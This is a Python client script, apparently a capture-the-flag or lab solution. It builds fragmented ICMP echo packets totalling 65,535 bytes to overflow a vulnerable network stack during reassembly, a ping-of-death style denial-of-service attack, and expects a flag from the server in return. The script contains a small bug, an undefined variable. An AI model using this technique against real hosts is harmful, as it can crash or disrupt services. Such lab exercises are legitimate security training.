import socket
import signal
import sys

import threading
from threading import Thread
from socketserver import ThreadingMixIn 

import util as util
from constants import CONSTANTS


def send_packet(socket, msg: bytes):
	m_len = util.big_endian(len(msg))
	util.send_msg(socket, m_len, msg)

def create_echo_request() -> bytes:
	#ID is used to uniquely identify the fragments of a particular datagram
	#I think it can be anything so pick random id from 2^10, to max number in 16 bits
	packet_id = util.generate_id()
	icmp_id = util.generate_id()
	#Accounts for size of IPv4 header and ICMP header (28bytes)
	extra = (("Never quit." *133)+ "Or do it.").encode()
	icmp_message = util.build_ICMP_message( CONSTANTS.ICMP_TYPE.ECHO_REQUEST, icmp_id, code = 0, extra= extra)
	last_fragment = True
	fragment_offset = 0
	return util.build_packet(icmp_message, packet_id, fragment_offset, last_fragment)

def send_fragmented_packet(socket, msg_type : str, payload_size: int) -> int:
	#count of the amount of packets
	count =1
	icmp_id = util.generate_id()
	packet_id = util.generate_id()
	#The actual content doesn't matter. As long as there is overflow
	payload = (("N" *payload_size)).encode()

	max_payload_size = CONSTANTS.MTU - (20) #20 IPv4 header bytes & 8 ICMP header bytes
	last_fragment = True if (payload_size+20+8) < CONSTANTS.MTU else False
	#Initially sending ICMP header with payload
	payload_init= util.build_ICMP_message(msg_type, icmp_id, extra = payload[0:max_payload_size-8], code = 0)
	init_packet = util.build_packet(payload_init, packet_id, fragment_offset=0, last_fragment= False )
	#Send the initial packet
	send_packet(socket, init_packet)
	print("sent initial: \n\n", init_packet,"\n\n")
	
	#Remove the sent part of payload
	payload= payload[max_payload_size:]
	#Update the frag_offset
	frag_offset = int(max_payload_size/8)

	while payload != b'' and not last_fragment:
		frag_payload = payload[0:max_payload_size]
		#If this is the case then this is our last fragment
		if(len(frag_payload) < max_payload_size):
			last_fragment = True
		fragment_packet =  util.build_packet(frag_payload, packet_id, frag_offset, last_fragment)
		send_packet(socket,  fragment_packet)
		payload = payload[max_payload_size:]
		frag_offset += int(max_payload_size/8)
		print("sent a fragment: \n\n", fragment_packet, "\n\n")
		count+=1
	return count		

def main():

	#Establish connection
	clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	clientSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	#Similar to C style accept and returns errno unlike connect which only raises an exception
	result= clientSocket.connect_ex((CONSTANTS.DEST_IP, CONSTANTS.DEST_PORT))

	if (result == 0):
		print("\nConnection Estabished  -> IP: "+ CONSTANTS.DEST_IP + " Port: " + str(CONSTANTS.DEST_PORT)+"\n")
		try:
			while True:
				try:
					'''
					Sends a echo request packet
					
					packet = create_echo_request()
					send_packet(clientSocket, packet)
					print("Sent a Packet: ", packet)

					'''

					#Send a packet with a payload size == payload_size. 
					#If size is greater than (2^15 -1) a vulnerable network stack will overflow when re-assembling fragments.
					sent= send_fragmented_packet(clientSocket, CONSTANTS.ICMP_TYPE.ECHO_REQUEST, payload_size=2**16-1)
					
					#Reads all the fragmented echo-reply responses from the server.
					for i in range (sent):
						server_reply= util.read_reply(clientSocket)
						print('From Server:\n\n', server_reply)

					if(util.is_connection_closed(server_reply)):
						clientSocket.close()
						print("\nConnection to server is closed\n")
						exit(0);
					
					#If DOS attack successful the server will send a flag to submit.
					server_reply= util.read_reply(clientSocket)
					print("Values: ", values,  end ="\n"+"___"*40+"\n")
						
				except socket.error:
					clientSocket.close()
					print("\nFailed to send data to server\n")
					exit(1);
		#If terminated with Ctrl + C
		except util.ExitAction:
			clientSocket.close()
			print("\nClient has been terminated")
			exit(0)		
	else:
		print("An error ocurred on connection")
		exit(0)
	
if __name__ == '__main__':
	signal.signal(signal.SIGINT, util.receiveSignal)
	main()
	#util.test()
